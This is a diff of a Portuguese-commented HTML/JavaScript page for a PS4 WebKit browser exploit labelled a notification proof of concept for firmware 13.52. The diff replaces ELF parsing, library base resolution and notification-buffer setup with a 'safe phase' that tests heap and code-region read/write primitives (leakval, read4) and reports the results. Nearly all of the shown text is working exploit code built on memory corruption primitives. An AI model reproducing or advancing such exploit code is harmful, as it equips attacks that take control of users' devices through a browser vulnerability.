@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — Notification PoC)</title>
+<title>PS4 WebKit Exploit (13.52 — Notification PoC 33)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -616,106 +616,76 @@ async function main() {
     setCard('c-wk', '0x' + webkitBase.toString(16) + '?');
 
     setTimeout(async () => {
-      // PS4 SPRX: 1º LOAD em file+0x4000 mapeia para VA 0.
-      // loadBase (do ctor) = VA 0 do código — NÃO tem ELF magic.
-      // Header ELF, se mapeado, fica em loadBase - 0x4000.
-      let elfHeaderBase = null;
-      try {
-        const atLoad = p.read4(webkitBase) >>> 0;
-        log('[*] Dword em loadBase: 0x' + atLoad.toString(16));
-
-        try {
-          const maybe = webkitBase.sub32(0x4000);
-          const m = p.read4(maybe) >>> 0;
-          log('[*] Dword em loadBase-0x4000: 0x' + m.toString(16));
-          if (m === 0x464C457F) {
-            elfHeaderBase = maybe;
-            log('[+] ELF header encontrado em loadBase-0x4000', 'ok');
-          }
-        } catch (e) {
-          log('[!] Não leu loadBase-0x4000: ' + (e && e.message ? e.message : e), 'w');
-        }
-
-        if (!elfHeaderBase && atLoad === 0x464C457F) {
-          elfHeaderBase = webkitBase;
-          log('[+] ELF header no próprio loadBase', 'ok');
-        }
-
-        if (!elfHeaderBase) {
-          log('[!] Sem header ELF mapeado — usando só loadBase', 'w');
-        }
-      } catch (e) {
-        log('[-] Erro ao inspecionar loadBase: ' + (e && e.message ? e.message : e), 'e');
-      }
-
-      log('[+] WebKit loadBase: 0x' + webkitBase.toString(16), 'ok');
+      // ─── FASE SEGURA: não ler regiões de código ainda ───
+      // Leituras em loadBase/código do WebKit estavam causando crash nativo
+      // (page fault que try/catch JS não captura).
+      logH('FASE SEGURA — SEM LEITURA DE CÓDIGO');
+      log('[+] WebKit loadBase (calculada): 0x' + webkitBase.toString(16), 'ok');
       setCard('c-wk', '0x' + webkitBase.toString(16));
+      setStatus('Testando R/W no heap...', 'r');
 
-      // resolveAllBases: se tivermos ELF header, parseia a partir dele;
-      // senão tenta a partir do loadBase (pode falhar no magic e seguir fallback).
-      const parseBase = elfHeaderBase || webkitBase;
-      let result;
+      // 1) Confirmar que R/W funciona no HEAP (objeto JS)
+      let heapOk = false;
       try {
-        result = await resolveAllBases(p, parseBase, webkitBase);
+        const probe = { x: 0x41414141 };
+        const cell = p.leakval(probe);
+        log('[*] leakval(probe) = 0x' + cell.toString(16));
+        // butterfly / backing costuma ficar em cell+0x10 (varia, só teste)
+        const dw = p.read4(cell) >>> 0;
+        log('[*] dword em cell: 0x' + dw.toString(16));
+        heapOk = true;
+        log('[+] R/W no heap OK', 'ok');
       } catch (e) {
-        log('[-] resolveAllBases throw: ' + (e && e.message ? e.message : e), 'e');
-        setStatus('Erro no parsing ELF', 'e');
-        return;
-      }
-      if (!result) {
-        setStatus('Falha na resolução de bases', 'e');
-        return;
+        log('[-] R/W heap falhou: ' + (e && e.message ? e.message : e), 'e');
       }
 
-      imports = result.imports;
-      const libKernelBase = result.libkernelBase;
-      const libcBase = result.libcBase;
-
-      setStatus('Validando bases...', 'r');
-      const valid = await validateBases(p, libKernelBase, libcBase);
-
-      if (!valid.libkernel) {
-        setCard('c-lk', 'Falha na validação');
-        log('[-] libkernel base não passou na validação', 'e');
-      }
-      if (!valid.libc) {
-        setCard('c-lc', 'Falha na validação');
-        log('[-] libc base não passou na validação', 'e');
+      // 2) Teste ÚNICO e cuidadoso: ler 4 bytes no próprio endereço do ctor
+      //    (sabemos que está mapeado porque o ponteiro veio de lá)
+      let codeReadOk = false;
+      try {
+        log('[*] Tentando ler 4 bytes no ctor 0x' + ctorInt64.toString(16) + ' ...');
+        const atCtor = p.read4(ctorInt64) >>> 0;
+        log('[+] Leitura no ctor OK: 0x' + atCtor.toString(16), 'ok');
+        codeReadOk = true;
+      } catch (e) {
+        log('[-] Leitura no ctor FALHOU: ' + (e && e.message ? e.message : e), 'e');
+        log('[!] R/W provavelmente só funciona no heap, não em código/RX', 'w');
       }
 
-      if (valid.libkernel) {
+      // 3) Se leitura de código funcionou, tentar loadBase (1 dword só)
+      if (codeReadOk) {
         try {
-          const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
-          if (notif) {
-            setCard('c-g', 'Pronto');
-            setStatus('Buffer de notificação pronto!', 'ok');
-            log('[✓] Configuração de notificação concluída com sucesso.', 'ok');
-
-            const cbox = document.getElementById('cbox');
-            cbox.style.display = 'block';
-            document.getElementById('c-out').textContent =
-                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
-                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
-                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
-                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
-                'Função Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
-                'Notify wkOffset = 0x' + (notif.wkOffset ? notif.wkOffset.toString(16) : 'N/A');
-
-            logH('NOTIFICAÇÃO');
-            log('[+] sceKernelSendNotificationRequest resolvido dinamicamente', 'i');
-            log('[!] Execução nativa ainda requer ROP/JOP ou JIT pivot (não implementado)', 'w');
-            log('[!] Status: userland R/W ativo + bases resolvidas em runtime', 'w');
-          } else {
-            setCard('c-g', 'Falha');
-            log('[-] Falha ao preparar buffer de notificação', 'e');
-          }
+          log('[*] Tentando 1 dword em loadBase 0x' + webkitBase.toString(16) + ' ...');
+          const atBase = p.read4(webkitBase) >>> 0;
+          log('[+] loadBase dword: 0x' + atBase.toString(16), 'ok');
         } catch (e) {
-          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
+          log('[-] Leitura loadBase falhou: ' + (e && e.message ? e.message : e), 'e');
         }
-      } else {
-        setCard('c-g', 'Falha LK');
-        log('[-] Não foi possível validar a libkernel.', 'e');
       }
+
+      // Resumo — NÃO chama resolveAllBases / validateBases ainda
+      const cbox = document.getElementById('cbox');
+      cbox.style.display = 'block';
+      document.getElementById('c-out').textContent =
+          'WebKit loadBase = 0x' + webkitBase.toString(16) + '\n' +
+          'ctor            = 0x' + ctorInt64.toString(16) + '\n' +
+          'offset usado    = 0x' + hc.toString(16) + '\n' +
+          'heap R/W        = ' + (heapOk ? 'OK' : 'FAIL') + '\n' +
+          'code R/W (ctor) = ' + (codeReadOk ? 'OK' : 'FAIL') + '\n' +
+          '\nPróximo passo depende do code R/W.\n' +
+          'Se FAIL: precisamos de outra via (vtable/heap leak).\n' +
+          'Se OK: podemos parsear DYNAMIC com segurança.';
+
+      if (codeReadOk) {
+        setStatus('R/W código OK — pronto para parsing', 'ok');
+        setCard('c-g', 'code R/W OK');
+        log('[✓] R/W alcança código. Próximo: parsing com cuidado.', 'ok');
+      } else {
+        setStatus('R/W só no heap — parsing de código bloqueado', 'w');
+        setCard('c-g', 'só heap');
+        log('[!] Não vamos parsear ELF/código para evitar crash.', 'w');
+      }
+
     }, 800);
 
   } else {
